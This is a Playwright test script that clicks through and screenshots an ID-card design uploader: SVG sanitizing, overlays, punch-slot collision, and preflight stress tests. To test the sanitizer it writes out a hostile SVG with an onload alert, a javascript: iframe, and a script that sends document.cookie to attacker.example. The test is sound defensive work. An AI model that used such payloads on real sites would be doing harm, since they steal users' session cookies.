// scripts/capture_byod_phase2_screenshots.cjs
// ============================================================================
// Phase 2 Playwright Verification Script: Layers, Overlays & Prepress Validation
// Verifies SVG sanitizer, transparent arch overlay, punch-slot collision + 1-click fix,
// WCAG 2.2 AA soft legibility pill, and 4-case Preflight Stress Test Strip.
// ============================================================================

const { chromium } = require('playwright');
const path = require('path');
const fs = require('fs');
const sharp = require('sharp');

const OUT_DIR = 'C:/Users/hp/.gemini/antigravity/brain/607f29a2-17c7-4b9c-b3a0-d4836a0335af';

const hrHeadUser = {
  id: '0c621892-e938-4707-9957-13534ea32c19',
  auth_user_id: '0c621892-e938-4707-9957-13534ea32c19',
  email: 'marimuthu@joycorporatesolutions.com',
  full_name: 'Mari Muthu',
  name: 'Mari Muthu',
  role: 'HR Head',
  role_display_name: 'HR Head (Company)',
  organization_id: '0c621892-e938-4707-9957-13534ea32c19',
  tenant_id: '0c621892-e938-4707-9957-13534ea32c19',
  status: 'Active',
  account_status: 'ACTIVE',
  must_change_password: false,
  roles: [{ id: 'role-hr-head', name: 'HR Head', code: 'HR_HEAD' }],
  authContext: {
    userId: '0c621892-e938-4707-9957-13534ea32c19',
    authUserId: '0c621892-e938-4707-9957-13534ea32c19',
    identity: { email: 'marimuthu@joycorporatesolutions.com', fullName: 'Mari Muthu' },
    accountStatus: 'ACTIVE',
    tenant: { organizationId: '0c621892-e938-4707-9957-13534ea32c19', organizationName: 'Joy Corporate Solutions' },
    company: { companyId: 'comp-001', companyName: 'Joy Corporate Solutions Pvt Ltd' },
    roles: ['HR_HEAD'],
    primaryRole: 'HR Head',
    scopes: { platform: false, organization: true, company: true, employee: true, vendor: false },
    portalType: 'ORGANIZATION_ADMIN',
    allowedPortals: ['ORGANIZATION_ADMIN', 'EMPLOYEE_HR'],
    defaultPortal: 'ORGANIZATION_ADMIN',
    defaultRoute: 'people',
    permissions: ['*']
  }
};

async function createPhase2SampleAssets() {
  const frontPath = path.join(__dirname, 'sample_front_artwork.png');
  const overlayPath = path.join(__dirname, 'sample_arch_overlay.png');
  const hostileSvgPath = path.join(__dirname, 'hostile_test_artwork.svg');

  // 1. Transparent Arch Cut-Out Overlay (Layer 4)
  const overlaySvg = `
  <svg width="709" height="1082" xmlns="http://www.w3.org/2000/svg">
    <defs>
      <linearGradient id="archFrame" x1="0" y1="0" x2="1" y2="1">
        <stop offset="0%" stop-color="#10b981" stop-opacity="0.95"/>
        <stop offset="100%" stop-color="#047857" stop-opacity="0.95"/>
      </linearGradient>
    </defs>
    <!-- Decorative Arch Frame Ribbon overlapping the photo edges -->
    <path d="M 190 490 A 165 165 0 0 1 520 490 L 520 535 L 190 535 Z" fill="none" stroke="url(#archFrame)" stroke-width="16"/>
    <!-- Verified Corner Badge over photo bottom-right -->
    <circle cx="485" cy="515" r="28" fill="#059669" stroke="#ffffff" stroke-width="5"/>
    <path d="M 473 515 L 482 524 L 499 506" fill="none" stroke="#ffffff" stroke-width="5" stroke-linecap="round" stroke-linejoin="round"/>
  </svg>
  `;
  await sharp(Buffer.from(overlaySvg)).png().toFile(overlayPath);

  // 2. Hostile SVG with embedded <script>, <foreignObject>, and onload handler
  const hostileSvg = `<svg width="709" height="1082" xmlns="http://www.w3.org/2000/svg" onload="alert('XSS')">
    <script>fetch('https://attacker.example/steal?cookie=' + document.cookie)</script>
    <foreignObject width="100" height="100">
      <iframe src="javascript:alert('foreignObject')"></iframe>
    </foreignObject>
    <rect width="709" height="1082" fill="#0f172a"/>
    <text x="354" y="145" font-family="Arial, sans-serif" font-size="28" font-weight="bold" fill="#ffffff" text-anchor="middle">JOY CORPORATE (SANITIZED SVG)</text>
  </svg>`;
  fs.writeFileSync(hostileSvgPath, hostileSvg, 'utf-8');

  console.log('✓ Generated Phase 2 transparent arch overlay PNG and hostile test SVG');
  return { frontPath, overlayPath, hostileSvgPath };
}

async function run() {
  console.log('🚀 Starting Phase 2 Layers, Overlays & Prepress Playwright Suite...');
  const { frontPath, overlayPath, hostileSvgPath } = await createPhase2SampleAssets();

  const browser = await chromium.launch({ headless: true });

  const viewports = [
    { name: '1440x900', width: 1440, height: 900 },
    { name: '1920x1080', width: 1920, height: 1080 }
  ];

  for (const vp of viewports) {
    console.log(`\n================ Viewport: ${vp.name} ================`);
    const context = await browser.newContext({ viewport: { width: vp.width, height: vp.height } });
    const page = await context.newPage();

    await page.addInitScript((user) => {
      localStorage.setItem('joy_user', JSON.stringify(user));
      localStorage.setItem('workforce_current_user', JSON.stringify(user));
      sessionStorage.setItem('workforce_current_user', JSON.stringify(user));
      localStorage.setItem('workforce_active_org_id', user.organization_id);
      localStorage.setItem('workforce_auth_context', 'tenant');
      localStorage.setItem('workforce_active_route', 'id-cards');
      localStorage.setItem('joy_id_card_studio_v2', 'true');
    }, hrHeadUser);

    await page.goto('http://localhost:3000/id-cards', { waitUntil: 'domcontentloaded', timeout: 30000 });
    await page.waitForTimeout(2000);

    // Open "Upload My Design (Own Artwork)"
    const uploadTrigger = page.locator('text=Upload My Design (Own Artwork)').first();
    await uploadTrigger.click();
    await page.waitForTimeout(800);

    // Step 1A: Upload hostile SVG first to verify & capture SVG Sanitizer warning banner
    const fileInputs = page.locator('input[type="file"]');
    await fileInputs.nth(0).setInputFiles(hostileSvgPath);
    await page.waitForTimeout(800);

    const svgSanitizerPath = path.join(OUT_DIR, `byod_phase2_svg_sanitizer_${vp.name}.png`);
    await page.screenshot({ path: svgSanitizerPath });
    console.log(`✓ 1. Hostile SVG Sanitizer Banner (${vp.name}) -> ${svgSanitizerPath}`);

    // Now upload high-res Front Artwork PNG for the rest of the flow
    await fileInputs.nth(0).setInputFiles(frontPath);
    await page.waitForTimeout(800);

    // Confirm legal rights checkbox
    const checkboxes = page.locator('input[type="checkbox"]');
    const count = await checkboxes.count();
    if (count > 0) {
      await checkboxes.last().check();
    }
    await page.waitForTimeout(500);

    // Advance Step 1 -> Step 2 -> Step 3
    await page.locator('button:has-text("Continue to Check Fit")').click();
    await page.waitForTimeout(800);
    await page.locator('button:has-text("Continue to Place Fields")').click();
    await page.waitForTimeout(1000);

    // Upload Transparent Arch Overlay (Layer 4) in Step 3
    const step3FileInputs = page.locator('input[type="file"]');
    if ((await step3FileInputs.count()) > 0) {
      await step3FileInputs.first().setInputFiles(overlayPath);
      await page.waitForTimeout(800);
    }

    // Add a Blood Group field on the card (which auto-selects it) and move its Y coordinate into the Punch Slot (Y = 4.5mm)
    const addBloodBtn = page.locator('button:has-text("Blood Group")').first();
    if (await addBloodBtn.isVisible()) {
      await addBloodBtn.click();
      await page.waitForTimeout(400);
    }

    // Enable Soft Legibility Pill checkbox
    const legibilityPillCheckbox = page.locator('label:has-text("Soft Legibility Pill") input[type="checkbox"]');
    if (await legibilityPillCheckbox.isVisible()) {
      await legibilityPillCheckbox.check();
      await page.waitForTimeout(400);
    }

    // Set Y (mm) to 4.5 to trigger the Lanyard Punch Slot collision detector
    const numberInputs = page.locator('input[type="number"]');
    const numCount = await numberInputs.count();
    if (numCount >= 2) {
      // Last number input in Selected Element properties is Y (mm)
      await numberInputs.nth(numCount - 1).fill('4.5');
      await page.waitForTimeout(600);
    }

    // 2. Capture Step 3 with Punch Slot Collision Banner + Overlay + Legibility Pill
    const collisionPath = path.join(OUT_DIR, `byod_phase2_step3_punch_collision_${vp.name}.png`);
    await page.screenshot({ path: collisionPath });
    console.log(`✓ 2. Step 3 Punch Slot Collision & Legibility Pill (${vp.name}) -> ${collisionPath}`);

    // Click "Nudge Below Slot (1-Click)" to resolve collision
    const nudgeBtn = page.locator('button:has-text("Nudge Below Slot (1-Click)")');
    if (await nudgeBtn.isVisible()) {
      await nudgeBtn.click();
      await page.waitForTimeout(600);
    }

    // 3. Capture Step 3 after 1-Click Nudge resolution
    const resolvedPath = path.join(OUT_DIR, `byod_phase2_step3_nudge_resolved_${vp.name}.png`);
    await page.screenshot({ path: resolvedPath });
    console.log(`✓ 3. Step 3 After 1-Click Nudge Resolution (${vp.name}) -> ${resolvedPath}`);

    // Advance to Step 4: Test Workforce & Edge-Case Validation
    await page.locator('button:has-text("Continue to Test")').click();
    await page.waitForTimeout(1000);

    // Switch to "Preflight Stress Tests (4 Cases)"
    const stressTabBtn = page.locator('button:has-text("Preflight Stress Tests (4 Cases)")');
    if (await stressTabBtn.isVisible()) {
      await stressTabBtn.click();
      await page.waitForTimeout(1000);
    }

    // 4. Capture Step 4 Preflight Stress Test Strip (Long Name, Tamil Script, No Photo, Missing Fields)
    const stressStripPath = path.join(OUT_DIR, `byod_phase2_step4_stress_tests_${vp.name}.png`);
    await page.screenshot({ path: stressStripPath });
    console.log(`✓ 4. Step 4 Preflight Stress Test Strip (${vp.name}) -> ${stressStripPath}`);

    await context.close();
  }

  await browser.close();
  console.log('\n🎉 All Phase 2 screenshots captured successfully!');
}

run().catch(err => {
  console.error('Fatal Phase 2 screenshot error:', err);
  process.exit(1);
});

